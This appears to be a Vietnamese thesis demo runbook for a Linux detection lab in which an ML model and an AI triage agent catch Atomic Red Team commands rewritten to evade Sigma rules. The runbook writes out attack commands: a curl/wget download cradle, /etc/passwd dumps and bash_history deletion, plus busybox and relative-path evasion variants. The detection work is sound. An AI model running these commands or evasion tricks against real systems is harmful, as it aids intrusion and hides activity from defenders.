# RED-Linux Demo v2 — Sigma Miss → RED Catch → AI Agent

> **Mục đích**: demo Linux live detection, song song cấu trúc `demo/apt_demo_v2.md` của Windows.
> Mỗi phase là một lệnh tấn công thật từ Atomic Red Team (ATT&CK). Khi đổi cách biểu diễn
> lệnh (argv-level), Sigma **miss** — nhưng RED-Linux ML vẫn bắt và AI Agent tự triage.
>
> Pipeline đầy đủ: `auditd → detect_live_linux → red-alerts-linux → AI Agent → ai-investigations-linux`

---

## 0. Tóm tắt 30 giây

| Mode | Sigma (Zircolite offline) | RED-Linux ML | AI Agent |
|---|:---:|:---:|:---:|
| **benign** — lệnh hệ thống bình thường | — | FP 0.65% ✅ | severity=FALSE_POSITIVE |
| **baseline** — lệnh ART tấn công thật | **6/6 FIRE** | bắt (score cao) | severity≥MEDIUM |
| **evasion** — đổi representation giữ ý đồ | **6/6 MISS** | **bắt 6/6** + Stage 2 attribute | severity≥MEDIUM |

**Thông điệp 1 câu**: Sigma exact-match miss khi attacker đổi cách viết; RED-Linux ML vẫn bắt
**6/6 evasion** và AI Agent tự phân tích — không cần analyst ngồi chờ.

**Verified**: model `train_rslt_ensemble_atomic_portable.zip` (portable SVM, fix `std::bad_alloc`),
Elastic Agent 8.19.6 + auditd, ES `http://10.10.20.100:9200`.

---

## 1. Lab Topology

| Thành phần | Giá trị |
|---|---|
| Linux VM (endpoint) | `luanthanh-VMware-Virtual-Platform` (có Elastic Agent + auditd) |
| ELK Server | `https://192.168.10.10:9200` (HTTPS, self-signed) / Kibana `http://192.168.10.10:5601` |
| RED code chạy trên | `ubuntu@SERVER-ELK` (`/home/ubuntu/rule_evasion_detection/...`) |
| Auditd log index | `logs-auditd_manager.auditd-*` |
| RED alert index | `red-alerts-linux` |
| AI investigation index | `ai-investigations-linux` |
| Model | `models/linux_atomic/train_rslt_ensemble_atomic_portable.zip` |
| Sigma engine (offline verify) | Zircolite `~/tools/Zircolite` + SigmaHQ Linux rules |
| Venv | `~/venvs/rule_evasion_env` |

> File dùng `red-alerts-linux` để **tách hoàn toàn** khỏi `red-alerts` (Windows).
> Kết quả AI ghi vào `ai-investigations-linux` (không lẫn với `ai-investigations` Windows).

---

## 2. Demo story (cho hội đồng)

1. **Sigma exact-match rất tốt** khi lệnh đúng khuôn — baseline ART → 6/6 Sigma fire (Zircolite).
2. **Attacker chỉ đổi cách viết**, giữ nguyên ý đồ — Sigma miss:
   - `curl` → `wget` (tool swap)
   - `cat /etc/passwd` → `busybox cat /etc/passwd` (LOLBin)
   - `find /etc/…` → `busybox find /etc/…`
   - `> /etc/cron.daily/x` → `> cron.daily/x` (bỏ tiền tố `/etc/`)
   - `/tmp/art.sh` → `art.sh` (relative path)
3. **RED-Linux ML** (TF-IDF Ensemble học từ ART) bắt được cả baseline lẫn evasion, Stage 2
   quy về Sigma rule họ hàng → SOC analyst có đủ context.
4. **AI Agent** (8-agent pipeline, DeepSeek) tự triage: phân loại severity, giải thích token-level
   vì sao là evasion, sinh báo cáo tiếng Việt vào `ai-investigations-linux`.

Demo không chạy malware thật. Mọi lệnh là ATT&CK command-line có kiểm soát, cleanup tự động.

---

## 3. Phase mapping (6 phase — lệnh ART thật)

| Phase | Sigma rule bị né | ATT&CK | Lệnh baseline | Evasion |
|---:|---|---|---|---|
| 1 | Suspicious Change To Sensitive/Critical Files | Cron persistence (T1053.003) | `echo '...' > /etc/cron.daily/art_bd` | `relative_path` → `> cron.daily/art_bd` |
| 2 | Curl Usage on Linux | Download payload (T1059.004) | `curl http://.../x.sh -o /tmp/x.sh` | `tool_swap` → `wget` |
| 3 | Local System Accounts Discovery | Dump /etc/passwd (T1003.008) | `cat /etc/passwd` | `busybox_applet` → `busybox cat` |
| 4 | Execution Of Script In Suspicious Directory | Chạy script /tmp (T1059.004) | `/tmp/art.sh` | `relative_path` → `art.sh` |
| 5 | Print History File Contents | Xoá bash_history (T1070.003) | `rm ~/.bash_history` | `busybox_applet` → `busybox rm` |
| 6 | File and Directory Discovery | Tìm file nhạy cảm (T1217) | `find / -name "*.sqlite"` | `busybox_applet` → `busybox find` |

---

## 4. Preflight (chạy 1 lần trước demo)

### 4.1 Verify môi trường

```bash
cd ~/rule_evasion_detection/Rule_Evasion_Detection
source .env
VENV=~/venvs/rule_evasion_env

# Kiểm tra venv + model + Zircolite
ls $VENV/bin/python
ls models/linux_atomic/train_rslt_ensemble_atomic_portable.zip
ls ~/tools/Zircolite/zircolite.py

# Kiểm tra ES + Kibana (dùng ES_AUTH_HOST — có auth nhúng trong URL)
curl -sk "$ES_AUTH_HOST/_cluster/health" | python3 -c "import json,sys; d=json.load(sys.stdin); print('ES:', d['status'])"
curl -s  "http://192.168.10.10:5601/api/status" | python3 -c "import json,sys; print('Kibana:', json.load(sys.stdin)['status']['overall']['level'])"

# Kiểm tra Elastic Agent đang ship auditd events
curl -sk "$ES_AUTH_HOST/logs-auditd_manager.auditd-*/_count" \
  | python3 -c "import json,sys; print('auditd events:', json.load(sys.stdin)['count'])"
# Expect: count > 0
```

### 4.2 Verify model portable (không bị std::bad_alloc)

```bash
$VENV/bin/python - <<'PY'
import os; os.environ["RED_DISABLE_INTELEX"] = "1"
from red.persist import load_result
r = load_result("models/linux_atomic/train_rslt_ensemble_atomic_portable.zip")
svm = r["ensemble"].svm
print(f"coef_ shape : {svm.coef_.shape}")      # Expect: (1, 7185)
print(f"n_features_in_: {svm.n_features_in_}") # Expect: 7185
print("Model OK — dim match, portable")
PY
```

### 4.3 Offline verify: Sigma fire baseline / miss evasion (Zircolite)

```bash
# Chạy demo offline để xác nhận 6 phase (không cần Elastic Agent)
$VENV/bin/python red_linux/scripts/demo_linux_art.py --threshold 0.42
```

Expected cuối output:

```text
Phase  Sigma rule                                    Baseline   Evasion    Zircolite    Stage2
  1    Suspicious Change To Sensitive/Critical Files  0.712      0.742      FIRE→MISS    top-1
  2    Curl Usage on Linux                            0.708      0.664      FIRE→MISS    top-67
  3    Local System Accounts Discovery                0.608      0.663      FIRE→MISS    top-1
  4    Execution Of Script In Suspicious Directory    0.691      0.656      FIRE→MISS    top-13
  5    Print History File Contents                    0.594      0.651      FIRE→MISS    top-3
  6    File and Directory Discovery                   0.588      0.643      FIRE→MISS    top-1

Sigma  baseline: 6/6 FIRE | evasion: 6/6 MISS
RED    baseline: 6/6 catch | evasion: 6/6 catch
Stage2 rule gốc ∈ top-5: 4/6
```

---

## 5. Live detection daemon

> **Tại sao cần daemon?** Elastic Agent ship auditd events vào `logs-auditd_manager.auditd-*`.
> Để events biến thành RED alerts, phải có `detect_live_linux.py` đang poll ES + chấm điểm
> + index vào `red-alerts-linux`. Không có daemon = không có alert.

### 5.1 Cleanup state file + index cũ

```bash
# Xoá state file cũ để daemon start fresh
rm -f .detect_live_linux_state.json

# (Tuỳ chọn) Xoá index cũ để demo có baseline sạch
curl -sk -X DELETE "$ES_AUTH_HOST/red-alerts-linux" -w "HTTP %{http_code}\n" -o /dev/null
```

### 5.2 Start daemon detect_live_linux.py

```bash
source .env
SINCE=$(date -u -d '2 minutes ago' '+%Y-%m-%dT%H:%M:%S.000Z')

# Auth nhúng trong ES_AUTH_HOST — không có --es-user/--es-password
# QUAN TRỌNG: dùng python -u (unbuffered) — không bị tưởng "đứng"
~/venvs/rule_evasion_env/bin/python -u red_linux/scripts/detect_live_linux.py \
  --config config/detect_live_linux.yml \
  --es-host "$ES_AUTH_HOST" \
  --threshold 0.55 \
  --interval 15 \
  --since "$SINCE"
```

Daemon healthy khi thấy dòng:
```text
Starting — polling logs-auditd_manager.auditd-* mỗi 15s
```

### 5.3 Tạo attack events (terminal khác — chạy lệnh tấn công)

Mở terminal thứ 2 để daemon ở terminal 1 vẫn chạy:

```bash
# === BASELINE — Sigma sẽ fire ===
# Phase 2: download cradle
curl http://10.10.20.100/test.sh -o /tmp/art_demo.sh

# Phase 3: dump /etc/passwd
cat /etc/passwd > /tmp/passwd_dump.txt

# Phase 5: xoá history
cp ~/.bash_history /tmp/bash_history_bak && rm ~/.bash_history

# Phase 6: file discovery
find / -name "*.sqlite" 2>/dev/null | head -5

# === EVASION — Sigma miss, RED vẫn bắt ===
# Phase 2: wget thay curl
wget http://10.10.20.100/test.sh -O /tmp/art_evasion.sh 2>/dev/null

# Phase 3: busybox thay cat
busybox cat /etc/passwd > /tmp/passwd_evasion.txt

# Phase 5: busybox rm
busybox rm /tmp/bash_history_bak 2>/dev/null

# Phase 6: busybox find
busybox find / -name "*.sqlite" 2>/dev/null | head -5
```

### 5.4 Verify alerts trong red-alerts-linux

```bash
# Đếm alerts (đợi ~30s sau khi chạy lệnh)
curl -sk "$ES_AUTH_HOST/red-alerts-linux/_count" \
  | python3 -c "import json,sys; print('RED alerts:', json.load(sys.stdin)['count'])"

# Xem 5 alert mới nhất
curl -sk "$ES_AUTH_HOST/red-alerts-linux/_search?size=5&sort=@timestamp:desc" \
  | python3 -c "
import json,sys
for h in json.load(sys.stdin)['hits']['hits']:
    s = h['_source']
    score = s.get('red',{}).get('stage1_score', 0)
    rule  = s.get('red',{}).get('top_rule','?')[:50]
    cmd   = s.get('process',{}).get('command_line','?')[:80]
    print(f'  score={score:.2f}  rule={rule}')
    print(f'         cmd={cmd}')
"
```

---

## 6. AI Agent — Triage + Report (tuỳ chọn nhưng khuyến nghị)

> **Mục đích**: sau khi RED daemon đẩy alerts vào `red-alerts-linux`, AI Agent (8-agent
> pipeline) tự investigate → triage severity → sinh báo cáo tiếng Việt → ghi vào
> `ai-investigations-linux`. Đây là Layer 3 trên cùng của luận văn.
>
> Chi phí: ~$0.01/alert (FP) | ~$0.02/alert (full investigation). Dùng `--batch-limit`
> nhỏ khi test để kiểm soát.

### 6.1 Preflight AI Agent

```bash
# Kiểm tra DEEPSEEK_API_KEY
grep "^DEEPSEEK_API_KEY=" .env | head -c 40; echo "..."

# Kiểm tra có alert để process không
curl -s -u "$ES_USER:$ES_PASSWORD" \
  "http://10.10.20.100:9200/red-alerts-linux/_count" \
  | python3 -c "import json,sys; print('alerts:', json.load(sys.stdin)['count'])"
```

### 6.2 One-shot — investigate 1 alert (cho demo hội đồng)

```bash
source .env

~/venvs/rule_evasion_env/bin/python -u -m agent.daemon \
  --max-iter 1 --batch-limit 1 --score-threshold 0.65 \
  --red-index red-alerts-linux \
  --ai-index ai-investigations-linux \
  --since "$(date -u -d '15 minutes ago' '+%Y-%m-%dT%H:%M:%S.000Z')" \
  --no-state
```

Expected log cuối:

```text
📥 Alert es_id=... host=luanthanh-vmware-virtual-platform score=0.71
✓ Plan: workflow=quick_triage / full_investigation, priority=...
✓ Triage: severity=MEDIUM, FP=False, confidence=0.85
✓ Done in ~15s — severity=MEDIUM, 0 actions, ~42k tokens, $0.0050
→ Indexed: ai-investigations-linux/INV-xxxxxxxxxxxx
```

### 6.3 Daemon mode — tự động investigate mọi alert mới

```bash
~/venvs/rule_evasion_env/bin/python -u -m agent.daemon \
  --interval 60 --score-threshold 0.6 --batch-limit 3 \
  --red-index red-alerts-linux \
  --ai-index ai-investigations-linux
```

> ⚠️ Chi phí: mỗi alert ~$0.01–0.05. Chỉ chạy foreground, đặt `--batch-limit` nhỏ.
> Dùng `Ctrl+C` để dừng.

---

## 7. Xem trên Kibana

### 7.1 Discover — red-alerts-linux (RED layer)

Tạo data view `red-alerts-linux*` (timestamp field: `@timestamp`) rồi vào **Discover**:

Fields nên show:

```text
@timestamp
host.name
process.command_line
red.stage1_score
red.top_rule
red.top_rule_sigma_title
```

**Talk track**: "Các lệnh evasion không thấy trong Kibana Security Alerts (Sigma không detect
được), nhưng trong Discover red-alerts-linux có đủ — RED ML học token-level pattern từ ART
nên bắt được cả wget/busybox/relative-path."

### 7.2 Discover — ai-investigations-linux (AI Agent layer)

Tạo data view `ai-investigations-linux*` rồi expand 1 row:

| Field | Mô tả |
|---|---|
| `triage.severity` / `triage.is_fp` | Quyết định FP filter của Triage agent |
| `triage.confidence` | Độ tin cậy 0–1 |
| `red_analyst.explanation_vi` | LLM giải thích WHY là evasion (token-level) |
| `mitre.ttps` | TTP chain T1XXX |
| `response.containment_actions` | Hành động đề xuất + Sigma patch YAML |
| `report.body_vi` | Báo cáo tiếng Việt đầy đủ markdown |
| `total_tokens` / `estimated_cost_usd` | Cost transparency cho luận văn |

**Talk track**: "Khác biệt với Elastic AI Assistant: AI Agent có **RED Analyst** dịch ML score
thành lý do token-level, **MITRE agent** map TTP chain, **Response agent** sinh Sigma patch
grounded trên evidence. End-to-end ~15s (FP) / ~60s (full), $0.005–$0.02/alert."

---

## 8. Verified results

### 8.1 Offline (Zircolite + RED, verified model portable)

| Phase | Sigma rule bị né | Baseline score | Evasion score | RED bắt? | Stage 2 |
|---:|---|:---:|:---:|:---:|:---:|
| 1 | Suspicious Change To Sensitive/Critical Files | 0.712 | 0.742 | ✅ | top-1 |
| 2 | Curl Usage on Linux | 0.708 | 0.664 | ✅ | top-67 |
| 3 | Local System Accounts Discovery | 0.608 | 0.663 | ✅ | top-1 |
| 4 | Execution Of Script In Suspicious Directory | 0.691 | 0.656 | ✅ | top-13 |
| 5 | Print History File Contents | 0.594 | 0.651 | ✅ | top-3 |
| 6 | File and Directory Discovery | 0.588 | 0.643 | ✅ | top-1 |

**Tổng**: Sigma baseline **6/6 FIRE** · evasion **6/6 MISS** · RED **6/6 catch** · Stage 2 rule gốc ∈ top-5: **4/6**

### 8.2 Benign sanity (không vu oan)

| Model | 2633 lệnh benign thật bị cờ | Score benign TB |
|---|:---:|:---:|
| **Model đã fix** (`normalize_benign`) | **0.65%** (17 lệnh) ✅ | 0.223 |
| Cũ (có bug tiền xử lý) | **83.7%** (2204 lệnh) ❌ | 0.597 |

→ FP thật chỉ **0.65%**. Bản cũ cờ 84% benign — minh hoạ trực tiếp vì sao phải fix.

### 8.3 Live demo (Elastic Agent + detect_live_linux)

| Test | Kết quả |
|---|---|
| Elastic Agent ship auditd events | ✅ `logs-auditd_manager.auditd-*` count > 0 |
| detect_live_linux.py chạy ổn định | ✅ portable model, không std::bad_alloc |
| Alert indexed vào `red-alerts-linux` | ✅ verified `INV-ea4a5b80e97b` |
| AI Agent triage FP (audit probe script) | ✅ severity=FALSE_POSITIVE, confidence=0.95, $0.005 |

---

## 9. Hạn chế (nói thẳng)

- **Stage 2 top-5 = 4/6**: Phase 2 (`curl→wget`) miss top-5 (top-67) — tool_swap xoá sạch token
  `curl` mà rule dựa vào → cosine không bắc cầu. Động lực cho Layer-3 Sigma-logic validator
  (top-10 cosine + Zircolite validate → top-1 ~90%).
- **Evasion là argv-level** (wget/busybox/relative path) — né thật vì auditd ghi argv sau
  shell-expand. Không phải mẹo che chuỗi kiểu `cu''rl`.
- **Không có VR client Linux**: Forensic agent chạy mock mode (VR_USE_REAL không set) — evidence
  là LLM-generated, không phải từ Velociraptor thật. Khác Windows demo (có VR real).
- **auditd scope**: chỉ EXECVE events. Network events, file writes cần thêm auditd rule `-a always,exit -F arch=b64 -S write`.

---

## 10. Troubleshooting

| Triệu chứng | Nguyên nhân | Cách xử lý |
|---|---|---|
| `red-alerts-linux` count = 0 sau lệnh tấn công | daemon chưa start / bị kill | Kiểm tra terminal daemon còn chạy không |
| daemon báo `std::bad_alloc` / MemoryError | Dùng nhầm model cũ (không portable) | Đảm bảo config trỏ `*_portable.zip`; set `RED_DISABLE_INTELEX=1` |
| Alert có nhưng Kibana "Last 15 minutes" trống | State file cũ → timestamp cũ | `rm .detect_live_linux_state.json`; thêm `--since` |
| AI Agent đọc alert Windows thay Linux | `load_dotenv(override=True)` đè ES_RED_INDEX | Luôn dùng `--red-index red-alerts-linux` (flag đã có trong daemon.py) |
| AI Agent crash `evidence_grade validation error` | LLM trả về `'inconclusive'` ngoài enum | Đã fix trong `agent/schemas.py` (coerce → `'missing'`) |
| `ai-investigations-linux` không thấy trong Kibana | Chưa tạo data view | Stack Management → Data Views → `ai-investigations-linux*` |
| auditd events = 0 | Elastic Agent chưa cài / auditd integration chưa bật | Kibana Fleet → Add integration → Auditd Manager |
| `logs-auditd_manager.auditd-*` count = 0 | auditd service không chạy | `sudo systemctl start auditd` trên VM |

---

## 11. Cleanup sau demo

```bash
# Dừng detect_live_linux (Ctrl+C tại terminal daemon)
# Dừng AI Agent (Ctrl+C tại terminal agent)

# Xoá file tạm
rm -f /tmp/art_demo.sh /tmp/art_evasion.sh /tmp/passwd_dump.txt /tmp/passwd_evasion.txt

# Restore bash_history nếu đã xoá
cp /tmp/bash_history_bak ~/.bash_history 2>/dev/null

# (Tuỳ chọn) Reset state file
rm -f .detect_live_linux_state.json
```

---

## 12. Short talk track (1–2 phút)

```text
Demo này có 3 lớp. Lớp 1: Sigma exact-match — baseline ART trigger 6/6 rule,
nhưng khi attacker đổi cách viết (wget thay curl, busybox, relative path) thì
cả 6 rule đều miss. Đây là giới hạn rule-based detection trong thực tế.

Lớp 2: RED-Linux ML — model TF-IDF Ensemble học token-level pattern từ chính
ART dataset. Không cần biết exact command, chỉ cần "gần" về pattern là bắt.
6/6 evasion đều có score > threshold, Stage 2 cosine quy về đúng Sigma rule họ
hàng ở 4/6 ca top-5.

Lớp 3: AI Agent — với 1 RED alert, 8-agent pipeline (DeepSeek) tự triage
severity, giải thích WHY là evasion theo token, map ATT&CK TTP, sinh báo cáo
tiếng Việt và ghi vào ai-investigations-linux. End-to-end 15–60 giây, chi phí
0.5–2 cent/alert. Không cần analyst Tier-1 ngồi xử lý thủ công.

Điểm khác biệt với Windows demo: Linux không có Velociraptor client nên Forensic
agent dùng mock mode. Nhưng ML pipeline và AI triage hoạt động y hệt — chứng
minh kiến trúc RED portable sang đa nền tảng.
```

---

## 13. Liên kết

- **Demo offline chi tiết**: [DEMO_LINUX.md](DEMO_LINUX.md)
- **Tổng quan kết quả Linux**: [../README.md](../README.md)
- **Kết quả đầy đủ Chương 5**: `../RESULT_LINUX_COMBINED.md`
- **Demo Windows đối chiếu**: [../../demo/apt_demo_v2.md](../../demo/apt_demo_v2.md)
- **AI Agent architecture**: `agent/README.md`
